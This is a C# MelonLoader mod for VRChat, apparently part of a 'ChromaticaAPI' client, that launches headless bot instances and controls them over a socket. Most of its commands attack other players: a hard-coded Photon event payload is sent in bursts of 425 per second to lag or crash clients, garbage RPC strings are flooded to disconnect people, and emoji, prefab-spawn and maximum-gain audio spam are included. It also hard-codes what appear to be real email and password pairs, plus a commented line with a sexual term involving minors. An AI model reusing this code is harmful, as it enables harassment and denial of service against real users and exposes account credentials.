using MelonLoader;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;
using UnityEngine;
using VRC;
using VRC.SDKBase;

namespace ChromaticaAPI.ApplicationBot
{
    public class Bot : VRCModule
    {
        private const float MoveSpeed = 0.1f;
        public static Dictionary<string, int> LoginAndProfile = new Dictionary<string, int>()
        {
            //{ "loli porn:hewafgidsahgosaghsaodhgdsadaogihadsgdoag", 2 },
            { "djsilva42@gmail.com:Redwall1", 2 },
            { "e.abreu419@gmail.com:thegame19", 3 },
            // { "glacialchief:mikey413", 3 },
            // { "qazzaq144:2aqqa2144", 4 },
            // { "pretendno:cozmo111", 5 },
            // { "cattievideogames@gmail.com:nekoatsume12", 6 },
        };
        public static void MakeBot(int Profile)
        {
            File.WriteAllText(Directory.GetCurrentDirectory() + "\\ChromaticaAPI\\IsBot.txt", "true");
            Process.Start(Directory.GetCurrentDirectory() + "\\VRChat.exe", $"--profile={Profile} --fps=25 --no-vr -batchmode -noUpm -nographics -disable-gpu-skinning -no-stereo-rendering -nolog %2");
        }

        private static Dictionary<string, Action<string>> Commands = new Dictionary<string, Action<string>>()
        {
            { "SetLagTarget", (UserID) => {
                LagTarget = PlayerExtensions.GetPlayerByUserID(UserID);
                if (LagTarget != null)
                MelonLogger.Log($"Lag Target Found: {LagTarget.GetName()}");
            } },

            { "JoinWorld", (WorldID) => {
                Console.WriteLine("[Client] Joining World " + WorldID);
                if (RoomExtensions.Current_World != null)
                    Networking.GoToRoom(WorldID);
            } },

            { "ToggleBlockAll", (UserID) => {
                foreach (var player in PlayerExtensions.AllPlayers)
                    if (player.GetAPIUser().id != UserID)
                        player.Block(UserID != string.Empty);
            } },

            { "OrbitSelected", (UserID) => {
                OrbitTarget = UserID == string.Empty ? null : PlayerExtensions.GetPlayerByUserID(UserID);
            } },

            { "ToggleWorldLagger", (Enabled) => {
                EmojiSpam = Enabled != string.Empty;
                Application.targetFrameRate = Enabled == string.Empty ? 25 : 110;
            } },

            { "ClickTP", (Position) => {
                if (PlayerExtensions.LocalVRCPlayer != null) {
                    string[] Split = Position.Split(':');
                    float X = float.Parse(Split[0]);
                    float Y = float.Parse(Split[1]);
                    float Z = float.Parse(Split[2]);
                    PlayerExtensions.LocalVRCPlayer.transform.position = new Vector3(X, Y, Z);
                }
            } },

            { "SetAvatar", (AvatarID) => {
                if (PlayerExtensions.LocalVRCPlayer != null) {
                    PlayerExtensions.ChangeAvatar(AvatarID);
                }
            } },

            { "RotateY", (Y) => {
                if (PlayerExtensions.LocalVRCPlayer != null) {
                    PlayerExtensions.LocalVRCPlayer.transform.Rotate(new Vector3(0, float.Parse(Y), 0));
                }
            } },

            { "EventCachingDCToggle", (Enabled) => {
                EventCachingDC = Enabled != string.Empty;
            } },

            { "SpinbotToggle", (Enabled) => {
                Spinbot = Enabled != string.Empty;
            } },

            { "SpinbotSpeed", (Speed) => {
                SpinbotSpeed = int.Parse(Speed);
            } },

            { "MoveForwards", (Empty) => {
                MovePlayer(Camera.transform.forward * MoveSpeed);
            } },

            { "MoveBackwards", (Empty) => {
                MovePlayer(Camera.transform.forward * -MoveSpeed);
            } },

            { "MoveRight", (Empty) => {
                MovePlayer(Camera.transform.right * MoveSpeed);
            } },

            { "MoveLeft", (Empty) => {
                MovePlayer(Camera.transform.right * -MoveSpeed);
            } },

            { "SpamInstantiate", (PrefabName) => {
                _PrefabName = PrefabName;
            } },

            { "Unmute", (Enabled) => {
                PlayerExtensions.Mute(Enabled == string.Empty);
            } },

            { "Earrape", (Enabled) => {
                PlayerExtensions.SetGain(Enabled == string.Empty ? 1f : float.MaxValue);
            } },

            { "SetTargetFramerate", (Framerate) => {
                if (int.TryParse(Framerate, out int n))
                    Application.targetFrameRate = n;
            } },

            { "WestCoastLagger", (Enabled) => {
                WestCoastLagger = Enabled != string.Empty;
            } },
        };

        private static GameObject Camera => ObjectExtensions.GetPlayerCamera;

        private static void MovePlayer(Vector3 pos)
        {
            if (PlayerExtensions.LocalVRCPlayer != null)
                PlayerExtensions.LocalVRCPlayer.transform.position += pos;
        }

        public static void ReceiveCommand(string Command)
        {
            var Index = Command.IndexOf(" ");
            var CMD = Command.Substring(0, Index); // Grabbing the command
            var Parameters = Command.Substring(Index + 1); // Grabbing the parameters
            HandleActionOnMainThread(()=> { Commands[CMD].Invoke(Parameters); }); // Calling the Action<string> related to the command
        }
        
        private static void HandleActionOnMainThread(Action action)
        {
            LastActionOnMainThread = action;
        }

        private static Player OrbitTarget;
        private static Action LastActionOnMainThread;
        private static bool EventCachingDC = false;
        private static bool Spinbot = false;
        private static int SpinbotSpeed = 20;

        public override void OnUpdate()
        {
            if (IsApplicationBot)
            {
                if (LastActionOnMainThread != null)
                {
                    LastActionOnMainThread();
                    LastActionOnMainThread = null;
                }
                HandleBotFunctions();
            }
        }

        private static IEnumerator RamClearLoop()
        {
            for (;;)
            {
                yield return new WaitForSeconds(5f);
                GC.Collect();
                GC.WaitForPendingFinalizers();
            }
        }

        public static IEnumerator EventCachingDCLoop()
        {
            for (; ; )
            {
                try
                {
                    if (EventCachingDC)
                    {
                        PlayerExtensions.SendVRCEvent(new VRC_EventHandler.VrcEvent()
                        {
                            ParameterInt = 1,
                            ParameterFloat = 0,
                            EventType = VRC_EventHandler.VrcEventType.SendRPC,
                            ParameterString = "詬ጋ蛸╫犯Ꙃ츆�繙ໞ㡕蚌낳猻샥⋛濊鈍鶬堾ꅊ속ᩂ⿴刏욫鮞⁢혭볖縱䶽ṳ翜ⶩ綮枞者⿗�≶珓촢켁沠鯙妆】℡�෺ﲴ짓焸뾱ፘᴷ礌廸럻⭍萨ᨧ졀᳿㍦뻈ꉢ웦栏ꘜず羧牞㟈긑쪰⫞ᙓ힁琄ጃॆ拤둮⫇蒭랊ꑃ雞辚筠ㄆᯟ皫፧ᤇᷠ犔ꨦ鿁⯊躇�뷕起该持᧩糓廰䜠�䄹㙔╀ை䶏ٟ㛶⸃斩䃎꓌Ṝ跏Ꮚ펵頰촻⩱⪪ﲉ轊‣缳뺁棓倮燕㉟祐ᨿ狶귭뭛䚐⦩켌揾篧料౉᪕㾪備첤㴹䶘婷딑벶Ḹ䚦꺁徭祃칒᾽◇얰愔蜵⨐�▌뢩鑰Ꙍ쫊△쏘먧겥ⰲ嶥櫜ፑ展찛ෳ媃즗踧ꛂ⭠퀹餽ⶭ堋鿥稊⎸縤㙑ᙅ븬笂꧲覧鍊卙�꓏첾⫅鈆凞虾衜ṏ휨뎛ຌ荕⸬위䗯쾮顜쮘湙셽귣禜끔呷갯ⷊ項酩麏佩삮ꐲ",
                        }, VRC_EventHandler.VrcBroadcastType.Always,
                        PlayerExtensions.LocalVRCPlayer.gameObject);
                    }
                }
                catch { }
                yield return new WaitForSeconds(0.5f);
            }
        }

        private static bool EmojiSpam = false;
        private static bool WestCoastLagger = false;
        private static string _PrefabName = "";

        private static void HandleBotFunctions()
        {
            if (EmojiSpam)
                SendEmoji(58);

            if (OrbitTarget != null && PlayerExtensions.LocalVRCPlayer != null)
            {
                Physics.gravity = new Vector3(0, 0, 0);
                alpha += Time.deltaTime * OrbitSpeed;
                PlayerExtensions.LocalPlayer.transform.position = new Vector3(OrbitTarget.transform.position.x + a * (float)Math.Cos(alpha), OrbitTarget.transform.position.y, OrbitTarget.transform.position.z + b * (float)Math.Sin(alpha));
            }

            if (Spinbot && PlayerExtensions.LocalVRCPlayer != null)
            {
                PlayerExtensions.LocalVRCPlayer.transform.Rotate(new Vector3(0f, SpinbotSpeed, 0f));
            }

            if (_PrefabName != "")
            {
                SpawnPrefab(_PrefabName);
            }
        }

        private static void SpawnPrefab(string Name)
        {
            GameObject obj = PlayerExtensions.InstantiatePrefab(Name,
                PlayerExtensions.LocalVRCPlayer.transform.position,
                new Quaternion(float.MaxValue, float.MaxValue, float.MaxValue, float.MaxValue));

            obj.SetActive(false);
        }

        private static void SendEmoji(int Number)
        {
            Networking.RPC(RPC.Destination.All,
                PlayerExtensions.LocalVRCPlayer.gameObject,
                "SpawnEmojiRPC",
                new Il2CppSystem.Object[1] {
                    new Il2CppSystem.Int32 {
                        m_value = Number
                    }.BoxIl2CppObject()
                });
        }

        public static float OrbitSpeed = 5f;
        public static float alpha = 0f;
        public static float a = 1f;
        public static float b = 1f;
        public static float Range = 1f;
        public static float Height = 0f;
        public static VRCPlayer currentPlayer;
        public static Player selectedPlayer;

        public static Player LagTarget;

        public override void OnStart()
        {
            MelonLogger.Log("OnStart Override Called");
            Load.InitPatches();
            if (File.ReadAllText(Directory.GetCurrentDirectory() + "\\ChromaticaAPI\\IsBot.txt") == "true") // not sure how else to do this with socket connection, tbh probs do it with arguments instead...
            {
                IsApplicationBot = true;
                MelonLogger.Log("I'm a bot!");
                File.WriteAllText(Directory.GetCurrentDirectory() + "\\ChromaticaAPI\\IsBot.txt", "");
                LagLoop().Start();
                WestCoastLaggerLoop().Start();
                EventCachingDCLoop().Start();
                RamClearLoop().Start();
                Load.InitAntiEmojiVRCEventPatch();
                SocketConnection.Client();
                return;
            }
            Load.UI = new AppBots();
            Load.UI.Show();
        }

        public override void OnLevelWasLoaded(int level)
        {
            MelonLogger.Log($"Loaded Level {level}");
            if (Load.UI != null)
                Load.UI.PlayerListBox.Items.Clear();
        }

        public static IEnumerator WestCoastLaggerLoop()
        {
            for (; ; )
            {
                try
                {
                    if (WestCoastLagger)
                    {
                        for (int i = 0; i < 425; i++)
                            SendLag();
                    }
                } catch { }
                yield return new WaitForSeconds(1f);
            }
        }

        // ap+OCswBAAAAJAA6MTg2QTEvVXNlckNhbWVyYUluZGljYXRvci9JbmRpY2F0b3IOAP8AAAAAAAAAAAoAVGltZXJCbG9vcAAAAAAEAAAL
        private static readonly byte[] LagData = new byte[] {
            106, 159, 142, 10, 204, 1, 0, 0,
            0, 36, 0, 58, 49, 56, 54, 65, 49, 47, 85,
            115, 101, 114, 67, 97, 109, 101, 114, 97,
            73, 110, 100, 105, 99, 97, 116, 111, 114,
            47, 73, 110, 100, 105, 99, 97, 116, 111,
            114, 14, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0,
            10, 0, 84, 105, 109, 101, 114, 66, 108,
            111, 111, 112, 0, 0, 0, 0, 4, 0, 0, 106
        };

        private static void SendLag()
        {
            PhotonExtensions.OpRaiseEvent(6,
                LagData,
                new Photon.Realtime.RaiseEventOptions()
                {
                    field_Public_ReceiverGroup_0 = Photon.Realtime.ReceiverGroup.Others,
                    field_Public_EventCaching_0 = Photon.Realtime.EventCaching.DoNotCache,
                },
                default
            );
        }

        public static IEnumerator LagLoop()
        {
            for (; ; )
            {
                try
                {
                    if (LagTarget != null)
                    {
                        LagTarget.ToggleBlock();
                    }
                }
                catch { }
                yield return new WaitForSeconds(0.6f);
            }
        }

        public static bool IsApplicationBot = false;
    }
}